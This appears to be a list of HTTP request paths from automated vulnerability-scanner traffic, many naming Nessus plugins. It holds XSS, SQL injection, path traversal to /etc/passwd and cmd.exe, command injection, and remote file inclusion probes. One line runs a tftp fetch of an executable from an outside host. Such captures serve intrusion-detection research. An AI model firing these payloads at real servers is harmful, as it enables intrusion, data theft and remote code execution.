"/<script>document.cookie=""testvowq=604;""</script>"
"/fpnpp5zg.pl?<meta http-equiv=set-cookie content=""testyias=101"">"
/scripts/weigh_keywords.php?etcdir=http://cirt.net/rfiinc.txt?
"/j4rdyhw8.php?<script>document.cookie=""testrluj=1420;""</script>"
"/help.php?q="";uname >q49727674 #"
/main.php?logout=/'
/main.php<?eval($_post['q54461335']);?eval($_post['q54461335']);?>
/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 412834017--
"/s7qus4g3.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/script_saved/
/comments.php?scriptpath=http://192.168.202.96:8080/frznctvhi0i5??
/index.php?page=../../../../../../../../../../../../../../../../../winnt/system32/ipconfig.exe
/m2fpztty.pl?<script>cross_site_scripting.nasl</script>
/phpmyadmin/index.php?string='
"/tuwjta1w.htm?<script>document.cookie=""testpokn=7494;""</script>"
"/cleartrust/ct_logon.asp?ctauthmode=basic&ctloginerrormsg=xx&ct_orig_uri=\"">< script>alert(1)/script><\"""
/cgi-915/ppdscgi.exe
"/main.php?logout=""ping;-w;10000;-n;1;4.3.2.1&rem;"
/javascript/nude.exe
/y8pmygrp.do?<script>cross_site_scripting.nasl</script>
/scripts/counter.exe
"/vac1l5vm.htm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/ybz5rz7a.php?<script>document.cookie=""testsbvw=6289;""</script>"
/examples/jsp/jsp2/jspx/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html
/javascript/htpasswd.rhtml
"/ju0u7kfo.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/cal/misc/audio.php?recording=../version.inc
/grid_subscriptions2/
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=lnu3g9zkqrlule9mw
/examples/jsp/colors/hw3.cgi?daysonly=0).system('id').(
"/eei78ore.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
../../../../../../../../../../../../etc/passwd
"/<meta http-equiv=set-cookie content=""testsixi=8451"">"
/javascript/hp.exe
"/qhvu0pdg.php?<script>document.cookie=""testchuc=2100;""</script>"
/cgi-bin/quickstore.cgi?page=../../../../../../../../../../etc/passwd\x00html&cart_id=
/main.php?logout=';uname >q89385457 #
/scripts/ggvfa_wichxq.asp
/eei78ore.php?<script>cross_site_scripting.nasl</script>
/javascript/.passwd.dll
/src/scripture.php?pageheaderfile=@rfiurl?pageheaderfile=@rfiurl?
"/securecgi-bin/csusercgi.exe?help+00.abcd.e.fghijk""""""><script>alert(""""""xss"""""")</script>"
"/index.php?config[""sipssys""]=http://192.168.202.118:8080/moclyxlwqyfjnp?"
/javascript/pc.exe
http://xxxxxxxxxxx.:80/<script>alert('vulnerable')</script>.cfm
"<meta http-equiv=set-cookie content=""testjvvf=7721"">"
/cgi-perl/fileseek2.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=
/nsn/..\util/ren.bas
/examples/servlets/servlet/faxsurvey?cat /etc/passwd
"/zabbix/frontends/php/locales.php?download=1&langto=1&extlang["".system('/./tmp/fetpkvinrp.sh+>+/dev/null+&').""]=1"
"/en-us/jnv890lt.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/scripts/save.php?file_save=/etc/passwd
"/phpmyadmin/notify?from=nessus""|id"""
/examples/jsp/error/index.php?op=default&date=200607' union select 1
"/help.php?q=""ping;-w;11000;-n;1;4.3.2.1&rem;"
/scripts/zdbyw3dn3gh2.html
"/q703m78q.kspx?<script>document.cookie=""testvowq=604;""</script>"
"/main.php?stuff=""&ver;>q22147997&rem;"
"/help.php?q=""|ping\xa0-w\xa09000\xa0-n\xa01\xa04.3.2.1|rem\xa0"
/script/tick/allincludefortick.php?path_to_code=http://192.168.202.118:8080/zz5thkvtmlgl?
"/v3axg1p8.cfm?<meta http-equiv=set-cookie content=""testxagh=6987"">"
"/p043snfr.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/main.php?logout=""|ping;-w;11000;-n;1;1.2.3.4|rem;"
/javascript/stored.exe
/launch.asp?nfuse_application=<script>alert('vulnerable')</script>
"/cacti/dsweb/services/user-1""><body onload=alert('xerox_docushare_dsweb_xss.nasl')>"
"/p043snfr.do?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/xfkun1ku.htm?<script>cross_site_scripting.nasl</script>
"/ghswfouu.cfm?<script>document.cookie=""testsqmm=5713;""</script>"
"/top.php?stuff=""rm\x09q12423295&rem\x09"
/main.php?stuff=&uname >q17531529 #
"/h5sc3gxy.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/javascript/reference.exe
"/interface/login/login_frame.php?site=""><!--#exec cmd=""dir \""--><"
/scripts/vzdybnanqpc3.asp
"/main.php?stuff=""&sleep\x099\x09#"
"/en-us/oie504mr.php3?<script>document.cookie=""testtpby=7052;""</script>"
/scripts/k0pxpjgnimox.cfm
/de3v2dd9.aspx?<script>cross_site_scripting.nasl</script>
"<meta http-equiv=set-cookie content=""testabrn=6368"">"
"/x7pclv4s.kspx?<meta http-equiv=set-cookie content=""testiulz=3709"">"
/scripts/quickstore.cgi?nessus&template=../../../../../../../../../../etc/passwd\x00html
/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331918976&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
/fnwhrxyd.htm?<script>cross_site_scripting.nasl</script>
/examples/jsp/sessions/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script
/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>
/examples/servlets/servlet/index.php?lng=../system_footer&sensor_program=phpsysinfo_241.nasl
"/bxnyrhmh.aspx?<meta http-equiv=set-cookie content=""testmjct=1867"">"
/scripts/misc/info.php
"/ybz5rz7a.html?<script>document.cookie=""testsbvw=6289;""</script>"
"<script>document.cookie=""testbnli=1975;""</script>"
"/help.php?q=""&ping\x09-w\x098000\x09-n\x091\x094.3.2.1&rem\x09"
"/<meta http-equiv=set-cookie content=""testxagh=6987"">"
"/main.php?stuff=""rm q23955852 #"
/scripts/ubbthreads.php
"/azcrfs8d.jspa?<meta http-equiv=set-cookie content=""testjpdr=9205"">"
"/examples/servlets/servlet/?""><script>alert('struts_sa_surl_xss.nasl')</script>"
/b5xdqgz2.cgi?<script>cross_site_scripting.nasl</script>
"/169okeyj.mscgi?<script>document.cookie=""testxeoi=3573;""</script>"
/scripts/axdgpyi2bn6f.php
/scripts/msmmask.exe?mask=/nessus312940811.asp
/recordings/admin.php?style=../../../../../../../../../../../../etc/passwd\x00
/examples/jsp/checkbox/index.php?templates_dir=/etc/passwd\x00
/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1332010394')</script>
/javascript/message.exe
/scripts/d3z7yywpyeoa.pl
"/top.php?stuff=""&ver&rem "
/examples/servlets/servlet/resetpw.php?email=../../../../../../../../../../../../etc/passwd
/javascript/solved.exe
"/index.php?action=search&searchfor=\""><script>alert('vulnerable')</script >"
"/main.php?stuff=""&ver;>q86839174&rem;"
"/oie504mr.nsf?<script>document.cookie=""testtpby=7052;""</script>"
"/nyvbv05h.cgi?<script>document.cookie=""testftxz=5980;""</script>"
/javascript/dbmodules.exe
/mail.php?id='/**/union/**/select/**/1
/examples/jsp/cal/web_store/web_store.cgi?page=../../../../../../etc/passwd\x00.html
"/fpnpp5zg.asp?<script>document.cookie=""testyias=101;""</script>"
ftp://192.168.28.202/*<apache_mod_proxy_ftp_glob_xss.nasl>
/raanw4ia.mscgi?<script>cross_site_scripting.nasl</script>
/cgibin/fileseek2.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
/scripts/k0pxpjgnimox.shtml
"/h5i6crm3.mscgi?<meta http-equiv=set-cookie content=""testlihk=7070"">"
"/hipkz026.php?<script>document.cookie=""testyrbs=2855;""</script>"
"/6n7aacgg.cfm?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/num/demos/demo.browse.php?filename=/etc/passwd
"/jnt3f86c.htm?<meta http-equiv=set-cookie content=""testcmax=9270"">"
/help.php?q=uname\x09>q77267797\x09#
/bin/windmail.exe? -n c:\boot.ini hacker@hax0r.com | dir c:\\
/javascript/ppt.exe
"/dda2qr7j.pl?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/j2kdmfw4.cfc?<script>cross_site_scripting.nasl</script>
/index.php?module=topics&func=view&topicid=-1 union select null
/examples/jsp/jsp2/jspx/index.php?user_langue=../../../../../../../../../../etc/passwd
/0rufe52p.php3?<script>cross_site_scripting.nasl</script>
/static//..\..\..\..\..\..\..\..\etc/passwd
/cgi-915/a1stats/a1disp3.cgi?../../../../../../../etc/passwd
"/main.php?stuff=""ping"
/_vti_bin/shtml.exe
"/help.php?q=""rm\x0cq43711515&rem\x0c"
"/main.php?stuff="";rm\x09q18442351\x09#"
/cgi-bin/..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og
"/main.php?stuff=""ping -w 10000 -n 1 4.3.2.1&rem "
"/nuh3zirz.php3?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/bin/webcart/webcart.cgi?change=yes&code=phold&config=mountain&nextpage=;cat /etc/passwd|
"/o6ebbirj.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/examples/jsp/cal/viewcvs.cgi/?cvsroot=<script>foo</script>
/javascript/~log.exe
/cgi-bin/index.php?op=default&date=200607' union select 1
/cgi-bin/index.php?x=browse&category='union select '1'
/script/plugins/phpgacl/admin/index.php?path_inc=http://192.168.202.118:8080/zz5thkvtmlgl?
"/phpmyadmin/documentation.html?'""=1"
/index.php?cid='
/cacti/nucleus/libs/pluginadmin.php?globals[dir_libs]=/etc/passwd\x00
/examples/jsp/sessions/sawmill6cl.exe?ho+{complete_version}
"/apavxugx.jsp?<script>document.cookie=""testdnbh=5237;""</script>"
/javascript/pool.exe
/examples/jsp/num/index.php?_language=../../../../../../../../../../etc/passwd\x00
"/aj3pf49c.cfm?<script>document.cookie=""testnofv=4170;""</script>"
"/main.php?logout=""&ping"
/imp/mailbox.php3?actionid=6&server=x&imapuser=x';somesql+--&pass=x
/scripts/weigh_keywords.php?etcdir=http://192.168.202.96:8080/4dckqcc0acprbz?
"/9ko6m4c8.php3?<meta http-equiv=set-cookie content=""testylik=3403"">"
/scripts/index.php?id='union/**/select/**/0
"/top.php?stuff=""&del q85387982 #"
/javascript/.passwd.csproj
/javascript/catalogs.exe
"/jdx255ea.cfc?<meta http-equiv=set-cookie content=""testziyq=5055"">"
/recordings/phf?qalias=x\x0a/bin/cat /etc/passwd
/examples/jsp/num/popup.php?include_path=/etc/passwd\x00
"/top.php?stuff=""\x0asleep\x097\x09#"
/scripts/index.php?module=topics&func=view&topicid=-1 union select null
"/en-us/9kr0ih0v.asp?<script>document.cookie=""testzgnm=1183;""</script>"
/javascript/running.exe
/cgi-bin/home/search.asp?nchannel='1
"/main.php?logout=""del q21367835&rem "
/cgi-bin/..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og
/rv98iwjp.htm?<script>cross_site_scripting.nasl</script>
/cgi-bin/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd
/phpmyadmin/documentation.html?phpmyadmin=/etc/passwd
/examples/jsp/error/calendar_admin.pl?config=|cat /etc/passwd|
/scripts/ck8pj.exe?/x+/c+tftp -i 192.168.202.118 get durjhxa1 qowmcdks.exe
/phpmyadmin/documentation.html?phpmyadmin=|cat /etc/passwd|
/main.php?logout='del\x09q76232693\x09#
/examples/jsp/num/install.php?newlang=../../cpg_error.log\x00
/javascript/closing.exe
/javascript/monitoring.exe
"/en-us/fo564rei.cgi?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/prescription010507/
"/if69ddo1.nsf?<meta http-equiv=set-cookie content=""testiabz=5220"">"
/javascript/roaming.exe
"/6qbynt4f.asp?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/jnv890lt.jspa?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/6qbynt4f.kspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
"/3hlysl2x.pl?<meta http-equiv=set-cookie content=""testgjbe=8505"">"
"/main.php?logout=""ping;-w;11000;-n;1;4.3.2.1&rem;"
/examples/jsp/cal/calendar_admin.pl?config=|cat /etc/passwd|
"/cgi-bin/search.jsp?q=%""<script>alert(1332008604)</script>"
/rtph263dumpscript/
/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=10nbpndw5e2ir1ncx
/cgi-bin/mlog.html?screen=/etc/passwd
"/main.php?stuff=""&ping\x09-w\x098000\x09-n\x091\x091.2.3.4&rem\x09"
/examples/jsp/jsp2/jspx/cal_make.pl?p0=../../../../../../../../../etc/passwd\x00
"/zroo33l4.php?<meta http-equiv=set-cookie content=""testiklc=904"">"
/top.php?stuff='\x0asleep\x097\x09#
"/scs86g1p.cfc?<script>document.cookie=""testquyx=2820;""</script>"
/d5a5renl.html?<script>cross_site_scripting.nasl</script>
/scripts/mapserv?map=mapserver_detect.nasl.map
/javascript/corporate.exe
/phpmyadmin/index.php?chemin=../../../../../../..//etc
/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>
"/ju0u7kfo.php?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/shoutbox/expanded.php?conf=../../../../../../../etc/passwd 
"/help.php?q=""rm\x09q12928131\x09#"
/en-us/account/more.php?id=1'
/examples/servlets/servlet/forum_2.php?msg=10&return=<script>foo</script>
/m2fpztty.idc?<script>cross_site_scripting.nasl</script>
"/l13b77e5.htm?<script>document.cookie=""testjvvf=7721;""</script>"
/javascript/.passwd.stackdump
/examples/jsp/num/mailbox.php3?actionid=6&server=x&imapuser=x';somesql&pass=x
/javascript/code.exe
"/manager/activatemember?activatecode=&member=""><script>alert('mvnforum_activatemember_xss.nasl')</script>"
"/o1zj4u9v.asp?<meta http-equiv=set-cookie content=""testabrn=6368"">"
/help.php?q='\x0auname #
/javascript/hit.exe
"/main.php?stuff=""ping\x09-w\x0910000\x09-n\x091\x091.2.3.4|rem\x09"
/subscriptions.doc
/include/scripts/run_auto_suspend.cron.php?dir=@rfiurl
/nyjgaorz.kspx?<script>cross_site_scripting.nasl</script>
"<meta http-equiv=set-cookie content=""testrluj=1420"">"
"/bugs/forgot_password.php?email=\""><script>alert(document.cookie)</script>"
"/jnt3f86c.dll?<meta http-equiv=set-cookie content=""testcmax=9270"">"
/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331919142&lang_crm=../../vtigerservice.php\x00
"/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"";ls+-l;rm+/tmp/ukirnkmpbn"""
/script_path/installation/index.php?mosconfig_absolute_path=http://192.168.202.96:8080/4dckqcc0acprbz??
/cgi-914/powerup/r.cgi?file=../../../../../../../../../../etc/passwd
/main.php?stuff=&ver
"/3j8echh0.php?<meta http-equiv=set-cookie content=""testfuqi=4189"">"
/subscriptions.config
/tlhhwkvs.exe/
/javascript/auth.exe
/awstats/awstats.pl?migrate=|echo;chmod 555 /tmp/urcppbumwm0;echo|awstats379091.txt
/opensiteadmin/scripts/classes/form.php?path=http://192.168.202.96:8080/4dckqcc0acprbz?\x00
/help.php?q=uname >q18373347 #
/lib/adodb_lite/adodb-perf-module.inc.php?last_module=zzz_adoconnection{}system(id);class zzz_adoconnection{}//
/speech-transcript/
"/zv8tv7h8.do?<script>document.cookie=""testcqwz=9752;""</script>"
"/t7tm4m0b.aspx?<img src=""javascript:alert(cross_site_scripting.nasl);"">"
/manager/index.php?op=default&date=200607' union select 1
